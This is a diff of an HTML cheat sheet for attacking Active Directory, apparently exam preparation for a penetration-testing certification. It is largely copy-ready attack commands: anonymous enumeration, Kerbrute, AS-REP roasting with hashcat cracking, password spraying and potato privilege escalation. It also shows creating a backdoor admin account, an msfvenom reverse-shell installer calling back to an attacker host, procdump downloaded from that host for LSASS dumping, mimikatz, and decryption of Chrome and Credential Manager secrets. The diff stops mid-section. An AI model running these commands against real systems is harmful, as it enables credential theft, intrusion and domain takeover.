@@ -94,6 +94,18 @@
     /* FOOTER */
     footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
 
+    /* SIGNAL BOX — new format */
+    .sig-entry { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+    .sig-entry:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .sig-signal { color: var(--muted); display: block; margin-bottom: 4px; }
+    .sig-label { color: var(--yellow); }
+    .sig-cmd { color: var(--green); display: block; padding-left: 1em; }
+    .sig-note { color: var(--dim); font-size: 0.73rem; padding-left: 1em; display: block; font-style: italic; }
+    /* MOVE ON BOX */
+    .moveon { background: #f8514908; border: 1px solid #f8514955; border-left: 3px solid var(--red); border-radius: 6px; padding: 10px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.75; }
+    .moveon-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--red); margin-bottom: 7px; display: block; }
+    .moveon-item { color: var(--muted); display: block; padding-left: 0.5em; }
+    .moveon-item::before { content: "✗ "; color: var(--red); }
     /* COPY JS */
   </style>
   <script>
@@ -114,25 +126,1490 @@
 <div class="page">
   <aside class="sidebar">
     <div class="sidebar-label">On This Page</div>
-    <ul>
-      <li><a href="#p0">Phase 0: BloodHound</a></li>
-      <li><a href="#p1">Phase 1: Enum</a></li>
-      <li><a href="#p2">Phase 2: Kerberoasting</a></li>
-      <li><a href="#p3">Phase 3: AS-REP Roasting</a></li>
-      <li><a href="#p4">Phase 4: Password Spray</a></li>
-      <li><a href="#p5">Phase 5: Lateral Movement</a></li>
-      <li><a href="#p6">Phase 6: ACL Abuse</a></li>
-      <li><a href="#p7">Phase 7: DCSync + Proof</a></li>
-      <li><a href="#pivot">Pivoting — Ligolo-ng</a></li>
-    </ul>
+    <div class="sidebar-group">
+      <span class="sidebar-group-lbl">— Unauthenticated —</span>
+      <ul>
+        <li><a href="#unauth-smb">SMB Null Session</a></li>
+        <li><a href="#unauth-ldap">LDAP Anonymous</a></li>
+        <li><a href="#unauth-kerb">Kerbrute User Enum</a></li>
+        <li><a href="#unauth-asrep">AS-REP (no creds)</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-group">
+      <span class="sidebar-group-lbl">— Post-Compromise —</span>
+      <ul>
+        <li><a href="#local-enum">Local Enum (on box)</a></li>
+        <li><a href="#domain-enum">Domain Enum (from box)</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-group">
+      <span class="sidebar-group-lbl">— Authenticated —</span>
+      <ul>
+        <li><a href="#bloodhound">BloodHound</a></li>
+        <li><a href="#auth-enum">Enumeration</a></li>
+        <li><a href="#sysvol">SYSVOL / GPP</a></li>
+        <li><a href="#kerberoast">Kerberoasting</a></li>
+        <li><a href="#asrep">AS-REP Roasting</a></li>
+        <li><a href="#spray">Password Spray</a></li>
+        <li><a href="#lateral">Lateral Movement</a></li>
+        <li><a href="#ptt">Pass-the-Ticket</a></li>
+        <li><a href="#delegation">Delegation Attacks</a></li>
+        <li><a href="#gpo">GPO Abuse</a></li>
+        <li><a href="#acl">ACL Abuse</a></li>
+        <li><a href="#stuck">Stuck Checklist</a></li>
+        <li><a href="#dcsync">DCSync + Proof</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-group">
+      <span class="sidebar-group-lbl">— Infrastructure —</span>
+      <ul>
+        <li><a href="#pivot">Pivoting — Ligolo-ng</a></li>
+      </ul>
+    </div>
   </aside>
   <main class="main">
     <h1 class="page-title">🏛️ Active Directory</h1>
-    <p class="page-sub">Assumed-breach: you receive creds. Start BloodHound immediately — it maps your entire kill chain. AD set = 40pts. Attack it first.</p>
-    <div class="note n-bad">AD set is all-or-nothing for Domain Admin. Partial credit exists for early foothold steps but DA = full 40pts. Prioritize this above everything.</div>
+    <p class="page-sub">AD set = 40pts. Attack it first. Unauthenticated → get any creds → BloodHound immediately → follow the path.</p>
+    <div class="note n-bad">AD set is all-or-nothing for Domain Admin. Partial credit exists for early steps but DA = full 40pts. Prioritize this above everything.</div>
 
-    <section class="sec" id="p0">
-      <div class="sec-head"><h2>Phase 0 — BloodHound (Run Immediately)</h2></div>
+    <!-- ========== UNAUTHENTICATED ========== -->
+    <div style="margin: 2rem 0 1rem; padding: 6px 12px; background: #bc8cff12; border: 1px solid #bc8cff44; border-radius: 6px; font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--purple);">⬇ Unauthenticated — No creds yet</div>
+
+    <section class="sec" id="unauth-smb">
+      <div class="sec-head"><h2>SMB — Null Session Enum</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">null session + guest</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>crackmapexec smb &lt;DC_IP&gt; -u '' -p '' --shares
+crackmapexec smb &lt;DC_IP&gt; -u 'guest' -p '' --shares
+crackmapexec smb &lt;DC_IP&gt; -u '' -p '' --users     <span class="c"># sometimes works</span>
+rpcclient -U "" -N &lt;DC_IP&gt; -c "enumdomusers;querydispinfo"
+enum4linux-ng -A &lt;DC_IP&gt; -oA ~/exam/loot/smb_null</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Null session returns user list</span>
+          <span class="sig-cmd">rpcclient -U "" -N &lt;DC_IP&gt; -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' &gt; ~/exam/loot/users.txt <span class="sig-note">-- extract to users.txt</span></span>
+          <span class="sig-cmd">impacket-GetNPUsers &lt;domain&gt;/ -usersfile ~/exam/loot/users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat <span class="sig-note">-- immediately try AS-REP on the list</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Readable share found (e.g. NETLOGON, Users, Data)</span>
+          <span class="sig-cmd">smbclient //&lt;DC_IP&gt;/&lt;share&gt; -N <span class="sig-note">-- connect anonymously</span></span>
+          <span class="sig-cmd">crackmapexec smb &lt;DC_IP&gt; -u '' -p '' -M spider_plus <span class="sig-note">-- spider everything readable</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> querydispinfo returns description with password</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;found_pass&gt;' --continue-on-success <span class="sig-note">-- spray immediately</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">null + guest both return ACCESS_DENIED on all shares — no null session</span>
+        <span class="moveon-item">users.txt built from null session — move to Kerbrute + AS-REP immediately</span>
+      </div>
+    </section>
+
+    <section class="sec" id="unauth-ldap">
+      <div class="sec-head"><h2>LDAP — Anonymous Bind</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">test anonymous bind + dump</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Test if anonymous bind works:</span>
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingContexts
+<span class="c"># SUCCESS: namingContexts: DC=corp,DC=local ← use this as -b</span>
+
+<span class="c"># Dump all users anonymously:</span>
+ldapsearch -x -H ldap://&lt;DC_IP&gt; -b "DC=corp,DC=local" \
+  "(objectClass=user)" sAMAccountName description userAccountControl \
+  memberOf servicePrincipalName 2&gt;/dev/null | tee ~/exam/loot/ldap_anon.txt
+
+<span class="c"># Extract usernames:</span>
+grep "sAMAccountName:" ~/exam/loot/ldap_anon.txt | awk '{print $2}' &gt; ~/exam/loot/users.txt
+
+<span class="c"># Hunt passwords in descriptions:</span>
+grep "description:" ~/exam/loot/ldap_anon.txt | grep -iv "built-in\|default\|accounts"</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Anonymous bind works — users returned</span>
+          <span class="sig-cmd">grep "sAMAccountName:" ~/exam/loot/ldap_anon.txt | awk '{print $2}' &gt; ~/exam/loot/users.txt <span class="sig-note">-- build users.txt</span></span>
+          <span class="sig-cmd">impacket-GetNPUsers &lt;domain&gt;/ -usersfile ~/exam/loot/users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat <span class="sig-note">-- AS-REP roast immediately</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> description field contains plaintext password</span>
+          <span class="sig-cmd">crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --continue-on-success <span class="sig-note">-- validate + sweep</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Operations error (1) / Insufficient access (50)</span>
+          <span class="sig-note">-- Anonymous bind denied. Move to Kerbrute for user enum instead.</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="sec" id="unauth-kerb">
+      <div class="sec-head"><h2>Kerbrute — Username Enumeration (No Creds)</h2></div>
+      <div class="note n-warn">Kerbrute uses Kerberos pre-auth — does NOT trigger failed logon events (4625). Safe to run even with lockout policy.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">enumerate valid usernames</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>kerbrute userenum -d &lt;domain&gt; --dc &lt;DC_IP&gt; \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  -o ~/exam/loot/kerbrute_users.txt
+
+<span class="c"># Common name format wordlists to generate:</span>
+<span class="c"># firstname.lastname / f.lastname / flastname</span>
+cat ~/exam/loot/kerbrute_users.txt | grep "VALID" | awk '{print $7}' &gt; ~/exam/loot/users.txt</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> VALID USERNAME: john.doe@corp.local</span>
+          <span class="sig-cmd">cat ~/exam/loot/kerbrute_users.txt | grep "VALID" | awk '{print $7}' | cut -d@ -f1 &gt; ~/exam/loot/users.txt <span class="sig-note">-- extract clean usernames</span></span>
+          <span class="sig-cmd">impacket-GetNPUsers &lt;domain&gt;/ -usersfile ~/exam/loot/users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat <span class="sig-note">-- AS-REP roast the list</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Kerberos pre-auth disabled for a user (AS-REP hash returned by kerbrute)</span>
+          <span class="sig-cmd">hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt --force <span class="sig-note">-- crack immediately</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">users.txt has at least some usernames — run AS-REP and spray in parallel</span>
+        <span class="moveon-item">0 results after full wordlist — check domain name spelling, try with --safe flag</span>
+      </div>
+    </section>
+
+    <section class="sec" id="unauth-asrep">
+      <div class="sec-head"><h2>AS-REP Roasting — No Creds Required</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">roast without creds (needs users.txt)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-GetNPUsers &lt;domain&gt;/ -usersfile ~/exam/loot/users.txt \
+  -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat \
+  -outputfile ~/exam/loot/asrep_noauth.hashes
+
+hashcat -m 18200 ~/exam/loot/asrep_noauth.hashes /usr/share/wordlists/rockyou.txt --force
+hashcat -m 18200 ~/exam/loot/asrep_noauth.hashes /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule --force</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> $krb5asrep$23$ hash returned for a user</span>
+          <span class="sig-cmd">hashcat -m 18200 ~/exam/loot/asrep_noauth.hashes /usr/share/wordlists/rockyou.txt --force <span class="sig-note">-- crack, this gives you your first creds</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Hash cracked — first valid credentials obtained</span>
+          <span class="sig-note">-- You now have creds. Move to authenticated section. Run BloodHound immediately.</span>
+          <span class="sig-cmd">bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -dc &lt;DC_IP&gt; -c All --zip <span class="sig-note">-- ingest BloodHound now</span></span>
+        </div>
+      </div>
+    </section>
+
+    <!-- ========== POST-COMPROMISE ========== -->
+    <div style="margin: 2rem 0 1rem; padding: 6px 12px; background: #58a6ff12; border: 1px solid #58a6ff44; border-radius: 6px; font-family: var(--mono); font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--accent);">⬇ Post-Compromise — You have a shell on a domain-joined machine</div>
+
+    <section class="sec" id="local-enum">
+      <div class="sec-head"><h2>Local Enumeration — This Machine</h2></div>
+      <div class="note n-info">Run this entire section before touching the domain. Local SYSTEM → SAM + LSASS dump → hash spray is often a faster path to DA than any domain attack.</div>
+
+      <!-- CYCLE DIAGRAM -->
+      <svg width="100%" viewBox="0 0 680 820" style="margin:0.75rem 0;display:block;" role="img">
+        <title>AD Credential Escalation Cycle</title>
+        <desc>Each level of access breeds more opportunity, cycling from local SYSTEM through to Domain Admin.</desc>
+        <defs>
+          <marker id="cmarrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+            <path d="M2 1L8 5L2 9" fill="none" stroke="#8b949e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </marker>
+        </defs>
+
+        <!-- Level 1: Local SYSTEM — gray -->
+        <rect x="190" y="30" width="300" height="56" rx="8" fill="#21262d" stroke="#444c56" stroke-width="0.5"/>
+        <text x="340" y="52" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="14" font-weight="500">Local SYSTEM on a machine</text>
+        <text x="340" y="70" text-anchor="middle" dominant-baseline="central" fill="#8b949e" font-family="'Courier New',monospace" font-size="12">Potato, weak service, unquoted path</text>
+
+        <line x1="340" y1="86" x2="340" y2="118" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <text x="348" y="106" dominant-baseline="central" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">reg save SAM + SYSTEM</text>
+
+        <!-- Level 2: Local hashes — purple -->
+        <rect x="190" y="118" width="300" height="56" rx="8" fill="#2d2a3e" stroke="#6e5a9e" stroke-width="0.5"/>
+        <text x="340" y="140" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="14" font-weight="500">Local hashes (SAM dump)</text>
+        <text x="340" y="158" text-anchor="middle" dominant-baseline="central" fill="#bc8cff" font-family="'Courier New',monospace" font-size="12">Administrator + all local accounts</text>
+
+        <line x1="340" y1="174" x2="340" y2="206" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <text x="348" y="193" dominant-baseline="central" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">spray --local-auth across subnet</text>
+
+        <!-- Level 3: Pwn3d — teal -->
+        <rect x="150" y="206" width="380" height="56" rx="8" fill="#1a2e2a" stroke="#2a6b5e" stroke-width="0.5"/>
+        <text x="340" y="228" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="14" font-weight="500">Pwn3d! on other machines</text>
+        <text x="340" y="246" text-anchor="middle" dominant-baseline="central" fill="#3fb950" font-family="'Courier New',monospace" font-size="12">Same local hash reused across hosts</text>
+
+        <line x1="340" y1="262" x2="340" y2="294" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <text x="348" y="281" dominant-baseline="central" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">secretsdump remotely (SAM + LSASS)</text>
+
+        <!-- Level 4: Domain creds — amber -->
+        <rect x="150" y="294" width="380" height="68" rx="8" fill="#2d2600" stroke="#6b5a00" stroke-width="0.5"/>
+        <text x="340" y="316" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="14" font-weight="500">Domain creds found in LSASS</text>
+        <text x="340" y="334" text-anchor="middle" dominant-baseline="central" fill="#d29922" font-family="'Courier New',monospace" font-size="12">Domain users who logged into that machine</text>
+        <text x="340" y="350" text-anchor="middle" dominant-baseline="central" fill="#d29922" font-family="'Courier New',monospace" font-size="12">Service accounts, IT admins, helpdesk</text>
+
+        <!-- Split arrows -->
+        <line x1="260" y1="362" x2="160" y2="430" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <text x="155" y="400" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">no Pwn3d!</text>
+        <line x1="420" y1="362" x2="520" y2="430" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <text x="528" y="400" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">Pwn3d!</text>
+
+        <!-- Left branch: low priv — blue -->
+        <rect x="40" y="430" width="240" height="80" rx="8" fill="#0d1f36" stroke="#1f4a7a" stroke-width="0.5"/>
+        <text x="160" y="456" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="13" font-weight="500">Low-priv domain user</text>
+        <text x="160" y="474" text-anchor="middle" dominant-baseline="central" fill="#58a6ff" font-family="'Courier New',monospace" font-size="11">BloodHound → ACL paths</text>
+        <text x="160" y="490" text-anchor="middle" dominant-baseline="central" fill="#58a6ff" font-family="'Courier New',monospace" font-size="11">Kerberoast → AS-REP → spray</text>
+
+        <!-- Right branch: admin — coral -->
+        <rect x="400" y="430" width="240" height="80" rx="8" fill="#2d1a14" stroke="#7a3a28" stroke-width="0.5"/>
+        <text x="520" y="456" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="13" font-weight="500">Admin on domain machine</text>
+        <text x="520" y="474" text-anchor="middle" dominant-baseline="central" fill="#f0a080" font-family="'Courier New',monospace" font-size="11">More LSASS dumps</text>
+        <text x="520" y="490" text-anchor="middle" dominant-baseline="central" fill="#f0a080" font-family="'Courier New',monospace" font-size="11">More machines → more creds</text>
+
+        <!-- Converge arrows -->
+        <line x1="160" y1="510" x2="260" y2="578" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <line x1="520" y1="510" x2="420" y2="578" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+
+        <!-- Level 5: Higher priv — amber -->
+        <rect x="150" y="578" width="380" height="56" rx="8" fill="#2d2600" stroke="#6b5a00" stroke-width="0.5"/>
+        <text x="340" y="600" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="14" font-weight="500">Higher-privilege domain creds</text>
+        <text x="340" y="618" text-anchor="middle" dominant-baseline="central" fill="#d29922" font-family="'Courier New',monospace" font-size="12">IT admin, svc account, or DA in LSASS</text>
+
+        <line x1="340" y1="634" x2="340" y2="666" stroke="#8b949e" stroke-width="1" marker-end="url(#cmarrow)"/>
+        <text x="348" y="653" dominant-baseline="central" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">Pwn3d! on DC / secretsdump DC</text>
+
+        <!-- Level 6: Game over — teal -->
+        <rect x="150" y="666" width="380" height="68" rx="8" fill="#1a2e2a" stroke="#2a6b5e" stroke-width="0.5"/>
+        <text x="340" y="690" text-anchor="middle" dominant-baseline="central" fill="#e6edf3" font-family="'Courier New',monospace" font-size="14" font-weight="500">Domain Admin / DCSync</text>
+        <text x="340" y="708" text-anchor="middle" dominant-baseline="central" fill="#3fb950" font-family="'Courier New',monospace" font-size="12">All domain hashes dumped</text>
+        <text x="340" y="724" text-anchor="middle" dominant-baseline="central" fill="#3fb950" font-family="'Courier New',monospace" font-size="12">proof.txt → game over</text>
+
+        <!-- Cycle feedback arrow -->
+        <path d="M150 734 Q60 734 60 480 Q60 250 190 174" fill="none" stroke="#30363d" stroke-width="1" stroke-dasharray="5 4" marker-end="url(#cmarrow)"/>
+        <text x="26" y="460" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">each</text>
+        <text x="26" y="476" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">new</text>
+        <text x="26" y="492" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">hash</text>
+        <text x="26" y="508" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">feeds</text>
+        <text x="26" y="524" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">back</text>
+        <text x="26" y="540" text-anchor="middle" fill="#6e7681" font-family="'Courier New',monospace" font-size="11">in</text>
+      </svg>
+
+      <!-- STEP 1: WHO AM I -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 1 — who am I + what can I do</span><div class="cb-tags"><span class="tag t-crit">run first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>whoami                              <span class="c"># current user</span>
+whoami /all                         <span class="c"># full token — groups + ALL privileges</span>
+whoami /priv                        <span class="c"># SeImpersonatePrivilege enabled? → potato NOW</span>
+whoami /groups                      <span class="c"># local + domain group memberships</span>
+net user %username%                 <span class="c"># local account details</span>
+net localgroup administrators       <span class="c"># who else is local admin?</span>
+net localgroup "Remote Desktop Users"
+net localgroup "Remote Management Users"</pre></div>
+
+      <!-- STEP 2: PRIVESC TO SYSTEM -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 2 — escalate to SYSTEM</span><div class="cb-tags"><span class="tag t-crit">goal: SYSTEM</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Token impersonation — check OS version first:</span>
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+<span class="c"># Win10/11, Server 2019/2022 → GodPotato:</span>
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123! /add &amp;&amp; net localgroup administrators hacker /add"
+<span class="c"># Server 2016/2019, spooler running → PrintSpoofer:</span>
+sc query spooler
+.\PrintSpoofer64.exe -i -c cmd
+<span class="c"># Older systems → JuicyPotato (needs CLSID from ohpe/juicy-potato repo):</span>
+.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
+
+<span class="c"># Unquoted service paths:</span>
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
+icacls "C:\Program Files\Vulnerable App"   <span class="c"># (W) or (F) for Users = writable</span>
+<span class="c"># Drop msfvenom EXE at the unquoted segment, then:</span>
+sc stop &lt;service&gt; &amp;&amp; sc start &lt;service&gt;
+
+<span class="c"># Weak service permissions:</span>
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Everyone" *
+<span class="c"># SERVICE_CHANGE_CONFIG = you can redirect the binary:</span>
+sc config &lt;service&gt; binPath= "cmd /c net user hacker P@ss123! /add"
+sc stop &lt;service&gt; &amp;&amp; sc start &lt;service&gt;
+sc config &lt;service&gt; binPath= "cmd /c net localgroup administrators hacker /add"
+sc stop &lt;service&gt; &amp;&amp; sc start &lt;service&gt;
+
+<span class="c"># AlwaysInstallElevated — both keys must be 0x1:</span>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<span class="c"># If both = 1:</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\Windows\Temp\evil.msi</pre></div>
+
+      <!-- STEP 3: SYSTEM INFO + NETWORK -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 3 — system info + network recon</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>hostname
+systeminfo                          <span class="c"># OS, hotfixes, domain name, DC</span>
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain" /C:"Hotfix"
+ipconfig /all                       <span class="c"># IPs — DNS server is usually the DC</span>
+ipconfig /displaydns                <span class="c"># recently resolved hostnames</span>
+netstat -ano                        <span class="c"># all listening ports</span>
+netstat -ano | findstr LISTENING    <span class="c"># filter to listeners only</span>
+route print                         <span class="c"># other subnets this machine can reach</span>
+arp -a                              <span class="c"># hosts recently talked to — maps the network</span></pre></div>
+
+      <!-- STEP 4: SAVED CREDS + PASSWORD HUNT -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 4 — saved credentials + password hunting</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Saved Windows credentials:</span>
+cmdkey /list
+<span class="c"># If admin credential saved → runas /savecred immediately:</span>
+runas /savecred /user:&lt;domain&gt;\Administrator "C:\Windows\Temp\shell.exe"
+
+<span class="c"># Autologon password in registry:</span>
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+<span class="c"># Look for: DefaultPassword, DefaultUsername, AutoAdminLogon=1</span>
+
+<span class="c"># Registry password search:</span>
+reg query HKCU /f password /t REG_SZ /s 2&gt;nul | findstr /i "password"
+reg query HKLM /f password /t REG_SZ /s 2&gt;nul | findstr /i "password"
+
+<span class="c"># Filesystem password search:</span>
+findstr /si "password" *.xml *.ini *.txt *.config *.bak 2&gt;nul
+type C:\inetpub\wwwroot\web.config 2&gt;nul
+type C:\Windows\System32\sysprep\unattend.xml 2&gt;nul
+type "%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml" 2&gt;nul
+dir /s /b "C:\Users\*pass*" "C:\Users\*cred*" "C:\Users\*vnc*" 2&gt;nul</pre></div>
+
+      <!-- STEP 5: DPAPI -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 5 — DPAPI (browser + credential manager)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># secretsdump grabs DPAPI master keys automatically when run remotely.</span>
+<span class="c"># Manual DPAPI decrypt from victim shell (needs SYSTEM or same user context):</span>
+
+<span class="c"># Chrome saved passwords location:</span>
+type "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+<span class="c"># Can't read directly — use SharpChrome or mimikatz dpapi module:</span>
+.\mimikatz.exe
+dpapi::chrome /in:"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+<span class="c"># Windows Credential Manager blobs:</span>
+dir "%USERPROFILE%\AppData\Local\Microsoft\Credentials\"
+dir "%USERPROFILE%\AppData\Roaming\Microsoft\Credentials\"
+<span class="c"># Decrypt with mimikatz (needs master key — SYSTEM context recommended):</span>
+dpapi::cred /in:"C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\&lt;file&gt;"
+sekurlsa::dpapi
+
+<span class="c"># secretsdump also pulls DPAPI remotely if you have admin:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;</pre></div>
+
+      <!-- STEP 6: PROCESSES + SERVICES + SOFTWARE -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 6 — processes, services, installed software</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>tasklist /v                         <span class="c"># running processes + owner</span>
+sc query                            <span class="c"># running services</span>
+wmic service get name,pathname,startmode,startname | findstr /i "auto"
+wmic product get name,version       <span class="c"># installed software — searchsploit everything</span>
+<span class="c"># Watch for background processes (cron equivalent on Windows):</span>
+<span class="c"># Upload pspy equivalent: PowerUp.ps1 or just tasklist /v repeatedly</span>
+Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | select TaskName,TaskPath</pre></div>
+
+      <!-- STEP 7: SAM + LSASS DUMP -->
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 7 — dump SAM + LSASS</span><div class="cb-tags"><span class="tag t-crit">critical</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># From kali — full dump (SAM + LSASS + LSA secrets + DPAPI):</span>
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'
+
+<span class="c"># From victim shell — SAM only (offline, no LSASS):</span>
+reg save HKLM\SAM C:\Windows\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
+reg save HKLM\SECURITY C:\Windows\Temp\security.bak
+<span class="c"># Download to kali, then parse:</span>
+impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
+
+<span class="c"># LSASS memory dump (AV evasion — procdump):</span>
+(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/procdump.exe','C:\Windows\Temp\pd.exe')
+C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+<span class="c"># Download lsass.dmp to kali, then:</span>
+pypykatz lsa minidump lsass.dmp
+
+<span class="c"># mimikatz (if AV allows — try Bypass-4MSI in evil-winrm first):</span>
+.\mimikatz.exe
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords    <span class="c"># cleartext + hashes from LSASS</span>
+lsadump::sam                <span class="c"># local SAM hashes</span></pre></div>
+
+      <!-- STEP 8: CACHED DOMAIN LOGONS (DCC2) -->
